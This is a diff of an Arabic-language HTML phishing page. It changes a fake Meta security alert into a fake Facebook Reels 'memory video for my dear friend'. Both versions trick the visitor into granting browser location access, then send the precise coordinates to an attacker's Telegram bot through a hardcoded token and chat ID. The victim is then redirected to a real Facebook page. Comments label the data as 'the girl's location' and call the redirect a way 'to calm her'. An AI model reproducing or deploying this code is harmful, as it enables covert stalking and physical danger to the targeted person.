@@ -3,46 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مركز أمان ميتا - حماية المواقع</title>
+    <title>Facebook Reels | ذكرياتنا</title>
     <style>
-        body { background-color: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1a1a1a; padding: 25px; border-radius: 15px; border: 1px solid #ff3b30; width: 90%; max-width: 400px; text-align: center; }
-        .alert-icon { width: 60px; filter: invert(1); margin-bottom: 15px; }
-        h2 { color: #ff3b30; font-size: 18px; }
-        p { font-size: 14px; line-height: 1.6; color: #ccc; }
-        .btn { background-color: #ff3b30; color: white; padding: 12px; border-radius: 8px; border: none; font-weight: bold; width: 100%; cursor: pointer; margin-top: 15px; }
+        body { background-color: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .video-container { position: relative; width: 100%; max-width: 400px; height: 90vh; background: #111; border-radius: 15px; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; border: 1px solid #333; }
+        .play-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; border: 2px solid #fff; }
+        .play-btn::after { content: ''; display: block; width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #fff; margin-left: 5px; }
+        h2 { font-size: 18px; margin-top: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
+        p { font-size: 14px; color: #bbb; text-align: center; padding: 0 20px; }
+        .fb-logo { position: absolute; top: 20px; left: 20px; width: 30px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" class="alert-icon">
-    <h2>تحذير أمني عاجل!</h2>
-    <p>تم اكتشاف محاولة "تتبع نشط" لموقعك الجغرافي من جهاز غريب. <br><br> لتشفير موقعك الحالي ومنع التتبع، يرجى الضغط على الزر واختيار <b>(سماح/Allow)</b> لتفعيل بروتوكول الحماية فوراً.</p>
-    <button class="btn" onclick="secure()">تفعيل حماية الموقع</button>
+<div class="video-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo">
+    <div class="play-btn" onclick="startVideo()"></div>
+    <h2>مقطع خاص لصديقتي الغالية ❤️</h2>
+    <p>يرجى الضغط على زر التشغيل والسماح بالوصول للموقع لتشغيل الفيديو بجودة HD في منطقتك.</p>
 </div>
 
 <script>
-    const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg'; //
-    const chat_id = '7214473798'; //
+    const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
+    const chat_id = '7214473798';
 
-    function secure() {
-        const options = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }; //
+    function startVideo() {
+        const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
 
-        navigator.geolocation.getCurrentPosition(function(p) {
-            const lat = p.coords.latitude;
-            const lon = p.coords.longitude;
-            const acc = p.coords.accuracy;
-            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`; //
-            
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent('🚨 تم صيد الموقع بدقة!\n📍 ' + mapLink + '\n📏 الدقة: ' + acc.toFixed(1) + ' متر')}&parse_mode=Markdown`);
-            
-            alert("تم تفعيل التشفير بنجاح. موقعك الآن مخفي.");
-            window.location.href = "https://about.meta.com/technologies/security/";
-        }, function(e) {
-            alert("خطأ: لم يتم تفعيل الحماية! يجب الضغط على 'سماح' لحظر المتسللين.");
-            location.reload();
-        }, options);
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(p) {
+                const lat = p.coords.latitude;
+                const lon = p.coords.longitude;
+                const acc = p.coords.accuracy;
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                // إرسال الموقع لبوتك
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent('📍 موقع البنت (فيديو الذكريات):\n' + mapLink + '\n📏 الدقة: ' + acc.toFixed(1) + ' متر')}&parse_mode=Markdown`);
+                
+                // تحويلها لفيديو ريلز حقيقي عن الصداقة على فيسبوك لتهدئتها
+                window.location.href = "https://www.facebook.com/reel/1149257622814389"; 
+
+            }, function(e) {
+                alert("عذراً، يجب السماح بالموقع لتشغيل الفيديو بجودة عالية.");
+                location.reload();
+            }, options);
+        }
     }
 </script>
 </body>
